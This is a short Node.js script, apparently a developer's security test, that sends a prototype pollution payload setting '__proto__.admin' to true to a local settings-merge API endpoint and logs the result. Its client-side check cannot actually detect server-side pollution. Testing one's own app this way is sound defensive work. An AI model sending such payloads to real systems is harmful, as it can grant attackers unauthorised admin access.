import axios from 'axios';

const POLLUTION_PAYLOAD = {
    "__proto__": {
        "admin": true
    }
};

async function testPrototypePollution() {
    console.log("Testing Prototype Pollution...");
    try {
        const res = await axios.post('http://localhost:3000/api/system/merge-settings', {
            settings: POLLUTION_PAYLOAD
        });
        console.log("Response:", res.data);
        
        // Checking if pollution succeeded globally (if this script was part of the app)
        if (({}).admin === true) {
            console.log("VULNERABILITY CONFIRMED: Object prototype polluted!");
        } else {
            console.log("Vulnerability not confirmed globally in this script.");
        }
    } catch (err) {
        console.error("Error testing prototype pollution:", err.message);
    }
}

testPrototypePollution();
